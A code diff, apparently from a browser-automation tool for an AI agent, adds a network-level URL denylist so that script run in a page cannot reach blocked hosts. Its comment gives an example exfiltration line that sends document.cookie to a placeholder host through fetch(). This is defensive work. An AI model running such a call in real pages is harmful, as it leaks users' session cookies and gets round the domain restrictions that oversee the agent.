@@ -104,6 +104,35 @@ export async function attach(tabId: number): Promise<void> {
   // attach on the first command rather than at page load.
   await send(tabId, 'Runtime.enable').catch(() => {});
   await autoAttach(tabId);
+  await applyBlockedUrls(tabId);
+}
+
+/**
+ * Denylisted hosts, as CDP URL patterns. Set by the background from policy.
+ *
+ * The navigation guards cannot see a subresource request: `fetch()` inside
+ * `evaluate` reaches a blocked host without ever navigating, so nothing fires
+ * `onBeforeNavigate` and neither the pre-check nor the post-check applies. That
+ * is an exfiltration path — `fetch('https://blocked.test/?c=' + document.cookie)`
+ * — and it is exactly the one the domain lists are meant to close. Blocking at
+ * the network layer catches it wherever the request comes from, including script
+ * the agent never named.
+ *
+ * Denylist only, deliberately: an allowlist here would block every third-party
+ * subresource (CDNs, fonts, APIs) and break ordinary pages, which is a different
+ * question from where the *browser* may go.
+ */
+let blockedUrlPatterns: string[] = [];
+
+export function setBlockedUrlPatterns(patterns: string[]): void {
+  blockedUrlPatterns = patterns;
+  for (const tabId of attached) void applyBlockedUrls(tabId);
+}
+
+async function applyBlockedUrls(tabId: number): Promise<void> {
+  if (blockedUrlPatterns.length === 0) return;
+  await send(tabId, 'Network.enable').catch(() => {});
+  await send(tabId, 'Network.setBlockedURLs', { urls: blockedUrlPatterns }).catch(() => {});
 }
 
 /**
